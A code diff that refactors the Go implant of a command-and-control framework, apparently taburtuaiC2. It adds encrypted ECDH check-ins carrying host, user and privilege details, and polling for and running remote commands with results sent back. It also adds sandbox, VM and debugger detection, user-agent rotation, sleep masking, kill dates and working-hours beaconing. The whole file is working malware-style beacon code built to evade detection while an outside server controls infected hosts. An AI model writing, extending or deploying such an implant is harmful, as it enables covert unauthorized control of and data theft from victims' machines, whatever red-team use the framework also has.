@@ -11,66 +11,85 @@ import (
 	"runtime"
 	"time"
 
-	"github.com/mjopsec/taburtuaiC2/shared/crypto"
-	"github.com/mjopsec/taburtuaiC2/shared/types"
+	"github.com/mjopsec/taburtuaiC2/pkg/crypto"
+	"github.com/mjopsec/taburtuaiC2/pkg/types"
 )
 
-// Agent represents the main agent structure
+// AgentConfig holds all agent configuration baked in at build time
+type AgentConfig struct {
+	ServerURL    string
+	PrimaryKey   string
+	SecondaryKey string
+
+	// Beacon timing
+	Interval      int     // seconds
+	JitterPercent int     // 0-100
+	MaxRetries    int
+
+	// Kill switch / schedule
+	KillDate          string // YYYY-MM-DD; empty = never
+	WorkingHoursOnly  bool
+	WorkingHoursStart int // 24h hour, e.g. 8
+	WorkingHoursEnd   int // 24h hour, e.g. 18
+
+	// Evasion toggles
+	EnableEvasion     bool
+	SleepMasking      bool
+	UserAgentRotation bool
+}
+
+// Agent is the main implant runtime
 type Agent struct {
 	ID        string
-	ServerURL string
-	Interval  time.Duration
-	Jitter    float64
-	isRunning bool
+	cfg       *AgentConfig
 	client    *http.Client
-	crypto    *crypto.Manager
-	config    *Config
+	crypto    *crypto.Manager   // static key manager (pre-ECDH)
+	sessionMgr *crypto.Manager  // session key manager (post-ECDH); nil until handshake
 	evasion   *EvasionManager
+	isRunning bool
 }
 
-// Config holds agent configuration
-type Config struct {
-	ServerURL     string
-	PrimaryKey    string
-	SecondaryKey  string
-	Interval      int
-	Jitter        float64
-	EnableEvasion bool
-}
-
-// NewAgent creates a new agent instance
-func NewAgent(config *Config) (*Agent, error) {
-	cryptoMgr, err := crypto.NewManager(config.PrimaryKey, config.SecondaryKey)
+// NewAgent constructs and optionally validates the environment
+func NewAgent(cfg *AgentConfig) (*Agent, error) {
+	cryptoMgr, err := crypto.NewManager(cfg.PrimaryKey, cfg.SecondaryKey)
 	if err != nil {
-		fmt.Printf("[!] Failed to initialize crypto: %v\n", err)
+		fmt.Printf("[!] Crypto init failed: %v\n", err)
 		cryptoMgr = nil
 	}
 
-	// Initialize evasion manager
 	var evasionMgr *EvasionManager
-	if config.EnableEvasion {
-		evasionMgr = NewEvasionManager(GetDefaultEvasionConfig())
-
-		// Perform initial evasion checks
+	if cfg.EnableEvasion {
+		evasionMgr = NewEvasionManager(&EvasionConfig{
+			EnableSandboxDetection:  true,
+			EnableVMDetection:       true,
+			EnableDebuggerDetection: true,
+			UserAgentRotation:       cfg.UserAgentRotation,
+			SleepMasking:            cfg.SleepMasking,
+		})
 		if !evasionMgr.PerformEvasionChecks() {
-			return nil, fmt.Errorf("evasion checks failed - hostile environment detected")
+			return nil, fmt.Errorf("evasion checks failed — hostile environment detected")
 		}
 	}
 
 	return &Agent{
 		ID:        generateUUID(),
-		ServerURL: config.ServerURL,
-		Interval:  time.Duration(config.Interval) * time.Second,
-		Jitter:    config.Jitter,
-		isRunning: false,
+		cfg:       cfg,
 		client:    &http.Client{Timeout: 60 * time.Second},
 		crypto:    cryptoMgr,
-		config:    config,
 		evasion:   evasionMgr,
+		isRunning: false,
 	}, nil
 }
 
-// CollectInfo gathers system information
+// activeCrypto returns the session manager if ECDH completed, otherwise the static one
+func (a *Agent) activeCrypto() *crypto.Manager {
+	if a.sessionMgr != nil {
+		return a.sessionMgr
+	}
+	return a.crypto
+}
+
+// CollectInfo gathers basic system information for check-in
 func (a *Agent) CollectInfo() types.AgentInfo {
 	hostname, _ := os.Hostname()
 	username := os.Getenv("USER")
@@ -81,14 +100,11 @@ func (a *Agent) CollectInfo() types.AgentInfo {
 
 	privileges := "user"
 	if runtime.GOOS == "windows" {
-		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
-		if err == nil {
+		if _, err := os.Open("\\\\.\\PHYSICALDRIVE0"); err == nil {
 			privileges = "admin"
 		}
-	} else {
-		if os.Geteuid() == 0 {
-			privileges = "root"
-		}
+	} else if os.Geteuid() == 0 {
+		privileges = "root"
 	}
 
 	return types.AgentInfo{
@@ -103,41 +119,41 @@ func (a *Agent) CollectInfo() types.AgentInfo {
 	}
 }
 
-// Checkin performs agent checkin with the server
+// Checkin registers the agent with the server and performs ECDH if not yet done
 func (a *Agent) Checkin() error {
 	agentInfo := a.CollectInfo()
-	agentInfoJSON, err := json.Marshal(agentInfo)
-	if err != nil {
-		return err
+
+	// Build checkin payload
+	payload := map[string]any{
+		"id":           agentInfo.ID,
+		"hostname":     agentInfo.Hostname,
+		"username":     agentInfo.Username,
+		"os":           agentInfo.OS,
+		"architecture": agentInfo.Architecture,
+		"process_id":   agentInfo.ProcessID,
+		"privileges":   agentInfo.Privileges,
 	}
 
-	var payload []byte
-	if a.crypto != nil {
-		encrypted, err := a.crypto.EncryptData(agentInfoJSON)
-		if err != nil {
-			fmt.Printf("[!] Failed to encrypt checkin data: %v\n", err)
-			payload = agentInfoJSON
-		} else {
-			envelope := map[string]interface{}{"encrypted_payload": encrypted}
-			payload, _ = json.Marshal(envelope)
-			fmt.Printf("[*] Checkin data encrypted\n")
+	// Attach ephemeral ECDH public key if we don't have a session key yet
+	var ecdhSession *crypto.ECDHSession
+	if a.sessionMgr == nil {
+		var err error
+		ecdhSession, err = crypto.NewECDHSession()
+		if err == nil {
+			payload["ecdh_pub"] = ecdhSession.PubKeyB64
 		}
-	} else {
-		payload = agentInfoJSON
 	}
 
-	req, err := http.NewRequest("POST", a.ServerURL+"/api/v1/checkin", bytes.NewBuffer(payload))
+	body, err := a.marshalPayload(payload)
 	if err != nil {
 		return err
 	}
 
-	// Apply traffic obfuscation if evasion is enabled
-	if a.evasion != nil {
-		a.evasion.ObfuscateHTTPTraffic(req)
-	} else {
-		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+	req, err := http.NewRequest("POST", a.cfg.ServerURL+"/api/v1/checkin", bytes.NewBuffer(body))
+	if err != nil {
+		return err
 	}
-	req.Header.Set("Content-Type", "application/json")
+	a.setHeaders(req)
 
 	resp, err := a.client.Do(req)
 	if err != nil {
@@ -146,27 +162,39 @@ func (a *Agent) Checkin() error {
 	defer resp.Body.Close()
 
 	if resp.StatusCode != http.StatusOK {
-		body, _ := io.ReadAll(resp.Body)
-		return fmt.Errorf("checkin failed: %d - %s", resp.StatusCode, string(body))
+		b, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("checkin failed: %d — %s", resp.StatusCode, string(b))
+	}
+
+	// Parse response for ECDH public key
+	if ecdhSession != nil {
+		var apiResp types.APIResponse
+		if b, err := io.ReadAll(resp.Body); err == nil {
+			if json.Unmarshal(b, &apiResp) == nil {
+				if dataMap, ok := apiResp.Data.(map[string]any); ok {
+					if serverPub, ok := dataMap["ecdh_pub"].(string); ok && serverPub != "" {
+						sessionKey, err := ecdhSession.DeriveSessionKey(serverPub)
+						if err == nil {
+							a.sessionMgr, _ = crypto.NewManagerFromRawKey(sessionKey)
+							fmt.Printf("[+] ECDH handshake complete — session key established\n")
+						}
+					}
+				}
+			}
+		}
 	}
 
 	return nil
 }
 
-// GetNextCommand retrieves the next command from the server
+// GetNextCommand polls the server for the next pending command
 func (a *Agent) GetNextCommand() (*types.Command, error) {
-	url := fmt.Sprintf("%s/api/v1/command/%s/next", a.ServerURL, a.ID)
+	url := fmt.Sprintf("%s/api/v1/command/%s/next", a.cfg.ServerURL, a.ID)
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
 		return nil, err
 	}
-
-	// Apply traffic obfuscation
-	if a.evasion != nil {
-		a.evasion.ObfuscateHTTPTraffic(req)
-	} else {
-		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-	}
+	a.setHeaders(req)
 
 	resp, err := a.client.Do(req)
 	if err != nil {
@@ -178,115 +206,61 @@ func (a *Agent) GetNextCommand() (*types.Command, error) {
 		return nil, nil
 	}
 
-	body, err := io.ReadAll(resp.Body)
+	b, err := io.ReadAll(resp.Body)
 	if err != nil {
 		return nil, err
 	}
 
-	fmt.Printf("[*] Raw command response: %s\n", string(body)) // Debug log
-
-	var response types.APIResponse
-	if err := json.Unmarshal(body, &response); err != nil {
-		return nil, fmt.Errorf("failed to unmarshal API response: %v", err)
+	var apiResp types.APIResponse
+	if err := json.Unmarshal(b, &apiResp); err != nil {
+		return nil, fmt.Errorf("unmarshal API response: %v", err)
 	}
-
-	if !response.Success {
-		return nil, fmt.Errorf("server error: %s", response.Error)
+	if !apiResp.Success {
+		return nil, fmt.Errorf("server error: %s", apiResp.Error)
 	}
-
-	if response.Data == nil {
+	if apiResp.Data == nil {
 		return nil, nil
 	}
 
-	// Handle encrypted command and nested response structure
 	var cmdData []byte
-
-	// First, check if we have nested structure
-	if dataMap, ok := response.Data.(map[string]interface{}); ok {
-		var actualData interface{}
-
-		// Check for nested result structure first
-		if result, hasResult := dataMap["result"].(map[string]interface{}); hasResult {
-			actualData = result
-			fmt.Printf("[*] Found command in nested result structure\n")
-		} else {
-			actualData = response.Data
-			fmt.Printf("[*] Found command in direct structure\n")
-		}
-
-		// Check if data is encrypted
-		if dataMap2, ok := actualData.(map[string]interface{}); ok {
-			if encrypted, ok := dataMap2["encrypted"].(string); ok && a.crypto != nil {
-				fmt.Printf("[*] Decrypting command data\n")
-				decrypted, err := a.crypto.DecryptData(encrypted)
-				if err != nil {
-					return nil, fmt.Errorf("failed to decrypt command: %v", err)
-				}
-				cmdData = decrypted
-			} else {
-				// Not encrypted, marshal the data
-				cmdData, _ = json.Marshal(actualData)
+	if dataMap, ok := apiResp.Data.(map[string]any); ok {
+		if enc, ok := dataMap["encrypted"].(string); ok && a.activeCrypto() != nil {
+			decrypted, err := a.activeCrypto().DecryptData(enc)
+			if err != nil {
+				return nil, fmt.Errorf("decrypt command: %v", err)
 			}
+			cmdData = decrypted
+		} else if result, ok := dataMap["result"].(map[string]any); ok {
+			cmdData, _ = json.Marshal(result)
 		} else {
-			cmdData, _ = json.Marshal(actualData)
+			cmdData, _ = json.Marshal(dataMap)
 		}
 	} else {
-		cmdData, _ = json.Marshal(response.Data)
+		cmdData, _ = json.Marshal(apiResp.Data)
 	}
-
-	fmt.Printf("[*] Command data to unmarshal: %s\n", string(cmdData)) // Debug log
 
 	var cmd types.Command
 	if err := json.Unmarshal(cmdData, &cmd); err != nil {
-		return nil, fmt.Errorf("failed to unmarshal command: %v", err)
+		return nil, fmt.Errorf("unmarshal command: %v", err)
 	}
-
-	// Validate command has required fields
 	if cmd.ID == "" {
 		return nil, fmt.Errorf("command missing ID")
 	}
-	if cmd.Command == "" && cmd.OperationType == "" {
-		return nil, fmt.Errorf("command missing command text and operation type")
-	}
-
-	fmt.Printf("[*] Parsed command - ID: %s, Command: %s, Type: %s\n", cmd.ID, cmd.Command, cmd.OperationType)
-
 	return &cmd, nil
 }
 
-// SubmitResult sends command result back to server
+// SubmitResult sends a command result back to the server
 func (a *Agent) SubmitResult(result *types.CommandResult) error {
-	resultJSON, err := json.Marshal(result)
+	body, err := a.marshalPayload(result)
 	if err != nil {
 		return err
 	}
 
-	var payload []byte
-	if a.crypto != nil {
-		encrypted, err := a.crypto.EncryptData(resultJSON)
-		if err != nil {
-			fmt.Printf("[!] Failed to encrypt result: %v\n", err)
-			payload = resultJSON
-		} else {
-			envelope := map[string]string{"encrypted_payload": encrypted}
-			payload, _ = json.Marshal(envelope)
-		}
-	} else {
-		payload = resultJSON
-	}
-
-	req, err := http.NewRequest("POST", a.ServerURL+"/api/v1/command/result", bytes.NewBuffer(payload))
+	req, err := http.NewRequest("POST", a.cfg.ServerURL+"/api/v1/command/result", bytes.NewBuffer(body))
 	if err != nil {
 		return err
 	}
-
-	// Apply traffic obfuscation
-	if a.evasion != nil {
-		a.evasion.ObfuscateHTTPTraffic(req)
-	} else {
-		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-	}
-	req.Header.Set("Content-Type", "application/json")
+	a.setHeaders(req)
 
 	resp, err := a.client.Do(req)
 	if err != nil {
@@ -295,105 +269,147 @@ func (a *Agent) SubmitResult(result *types.CommandResult) error {
 	defer resp.Body.Close()
 
 	if resp.StatusCode != http.StatusOK {
-		body, _ := io.ReadAll(resp.Body)
-		return fmt.Errorf("submit result failed: %d - %s", resp.StatusCode, string(body))
+		b, _ := io.ReadAll(resp.Body)
+		return fmt.Errorf("submit result failed: %d — %s", resp.StatusCode, string(b))
 	}
-
 	return nil
 }
 
-// GetBeaconInterval calculates next beacon interval with jitter
-func (a *Agent) GetBeaconInterval() time.Duration {
-	if a.Jitter <= 0 {
-		return a.Interval
+// beaconInterval returns the next sleep duration with jitter applied
+func (a *Agent) beaconInterval() time.Duration {
+	base := time.Duration(a.cfg.Interval) * time.Second
+	if a.cfg.JitterPercent <= 0 {
+		return base
 	}
-
-	jitterRange := float64(a.Interval) * a.Jitter
-	jitterNs := int64(jitterRange)
-	if jitterNs <= 0 {
-		return a.Interval
+	jitterRange := int64(base) * int64(a.cfg.JitterPercent) / 100
+	if jitterRange == 0 {
+		return base
 	}
-
 	b := make([]byte, 8)
 	rand.Read(b)
-	randomJitter := int64(b[0])<<56 | int64(b[1])<<48 | int64(b[2])<<40 | int64(b[3])<<32 |
+	// Map random bytes to [-jitterRange, +jitterRange]
+	r := int64(b[0])<<56 | int64(b[1])<<48 | int64(b[2])<<40 | int64(b[3])<<32 |
 		int64(b[4])<<24 | int64(b[5])<<16 | int64(b[6])<<8 | int64(b[7])
-	randomJitter = randomJitter % (jitterNs * 2)
-	actualJitter := randomJitter - jitterNs
-
-	finalDuration := a.Interval + time.Duration(actualJitter)
-	if finalDuration < time.Second {
-		finalDuration = time.Second
+	jitter := (r % (jitterRange * 2)) - jitterRange
+	result := base + time.Duration(jitter)
+	if result < time.Second {
+		result = time.Second
 	}
-
-	return finalDuration
+	return result
 }
 
-// Start begins the agent main loop
+// sleep performs the beacon sleep, using VirtualProtect masking on Windows when enabled
+func (a *Agent) sleep(d time.Duration) {
+	if a.cfg.SleepMasking {
+		// Pass the active encryption key bytes as sensitive data to protect
+		var sensitive []byte
+		if mgr := a.activeCrypto(); mgr != nil {
+			sensitive = mgr.PrimaryKeyBytes()
+		}
+		maskedSleep(d, sensitive)
+	} else {
+		time.Sleep(d)
+	}
+}
+
+// Start runs the agent beacon loop
 func (a *Agent) Start() error {
 	a.isRunning = true
-	fmt.Printf("[*] Starting agent %s\n", a.ID)
-	fmt.Printf("[*] Server: %s\n", a.ServerURL)
-	fmt.Printf("[*] Interval: %v (jitter: %.1f%%)\n", a.Interval, a.Jitter*100)
+	fmt.Printf("[*] Agent %s starting — server: %s, interval: %ds ±%d%%\n",
+		a.ID, a.cfg.ServerURL, a.cfg.Interval, a.cfg.JitterPercent)
 
-	if a.evasion != nil {
-		fmt.Printf("[*] Evasion techniques enabled\n")
-	}
-
-	// Initial checkin
-	for i := 0; i < 3; i++ {
+	// Initial checkin with retries
+	for i := 0; i < a.cfg.MaxRetries; i++ {
 		if err := a.Checkin(); err != nil {
-			fmt.Printf("[!] Checkin attempt %d/3 failed: %v\n", i+1, err)
-			if i == 2 {
-				return fmt.Errorf("initial checkin failed: %v", err)
+			fmt.Printf("[!] Checkin attempt %d/%d failed: %v\n", i+1, a.cfg.MaxRetries, err)
+			if i == a.cfg.MaxRetries-1 {
+				return fmt.Errorf("initial checkin failed after %d attempts", a.cfg.MaxRetries)
 			}
-
-			// Use evasion sleep if available
-			if a.evasion != nil {
-				a.evasion.MaskedSleep(10 * time.Second)
-			} else {
-				time.Sleep(10 * time.Second)
-			}
+			a.sleep(10 * time.Second)
 		} else {
 			fmt.Printf("[+] Initial checkin successful\n")
 			break
 		}
 	}
 
-	// Main loop
 	for a.isRunning {
-		// Get command
-		cmd, err := a.GetNextCommand()
-		if err != nil {
-			fmt.Printf("[!] Failed to get command: %v\n", err)
-		} else if cmd != nil {
-			fmt.Printf("[*] Received command: %s (ID: %s)\n", cmd.Command, cmd.ID)
-			result := ExecuteCommand(a, cmd)
-			if err := a.SubmitResult(result); err != nil {
-				fmt.Printf("[!] Failed to submit result: %v\n", err)
+		// ── Kill date check ───────────────────────────────────────────────────
+		if a.cfg.KillDate != "" {
+			killDate, err := time.Parse("2006-01-02", a.cfg.KillDate)
+			if err == nil && time.Now().After(killDate) {
+				fmt.Printf("[*] Kill date %s reached — exiting\n", a.cfg.KillDate)
+				return nil
 			}
 		}
 
-		// Periodic checkin
+		// ── Working hours check ───────────────────────────────────────────────
+		if a.cfg.WorkingHoursOnly && a.cfg.WorkingHoursStart < a.cfg.WorkingHoursEnd {
+			now := time.Now()
+			h := now.Hour()
+			if h < a.cfg.WorkingHoursStart || h >= a.cfg.WorkingHoursEnd {
+				next := time.Date(now.Year(), now.Month(), now.Day(),
+					a.cfg.WorkingHoursStart, 0, 0, 0, now.Location())
+				if !now.Before(next) {
+					next = next.Add(24 * time.Hour)
+				}
+				fmt.Printf("[*] Outside working hours — sleeping until %s\n", next.Format("15:04"))
+				a.sleep(time.Until(next))
+				continue
+			}
+		}
+
+		// ── Poll + execute ────────────────────────────────────────────────────
+		cmd, err := a.GetNextCommand()
+		if err != nil {
+			fmt.Printf("[!] GetNextCommand: %v\n", err)
+		} else if cmd != nil {
+			result := ExecuteCommand(a, cmd)
+			if err := a.SubmitResult(result); err != nil {
+				fmt.Printf("[!] SubmitResult: %v\n", err)
+			}
+		}
+
+		// Periodic checkin to update LastSeen
 		if err := a.Checkin(); err != nil {
-			fmt.Printf("[!] Periodic checkin failed: %v\n", err)
+			fmt.Printf("[!] Periodic checkin: %v\n", err)
 		}
 
-		// Sleep with jitter and evasion
-		sleepDuration := a.GetBeaconInterval()
-		fmt.Printf("[*] Sleeping for %v\n", sleepDuration)
-
-		if a.evasion != nil {
-			a.evasion.MaskedSleep(sleepDuration)
-		} else {
-			time.Sleep(sleepDuration)
-		}
+		a.sleep(a.beaconInterval())
 	}
-
 	return nil
 }
 
-// Stop stops the agent
-func (a *Agent) Stop() {
-	a.isRunning = false
+// Stop halts the beacon loop
+func (a *Agent) Stop() { a.isRunning = false }
+
+// ── private helpers ───────────────────────────────────────────────────────────
+
+// marshalPayload JSON-encodes v and encrypts with the active key if available
+func (a *Agent) marshalPayload(v any) ([]byte, error) {
+	raw, err := json.Marshal(v)
+	if err != nil {
+		return nil, err
+	}
+	mgr := a.activeCrypto()
+	if mgr == nil {
+		return raw, nil
+	}
+	enc, err := mgr.EncryptData(raw)
+	if err != nil {
+		return raw, nil // fall back to plaintext on encrypt failure
+	}
+	wrapped, _ := json.Marshal(map[string]string{"encrypted_payload": enc})
+	return wrapped, nil
+}
+
+// setHeaders applies realistic HTTP headers; rotates User-Agent if enabled
+func (a *Agent) setHeaders(req *http.Request) {
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Accept", "application/json")
+	if a.evasion != nil {
+		a.evasion.ObfuscateHTTPTraffic(req)
+	} else {
+		req.Header.Set("User-Agent",
+			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+	}
 }
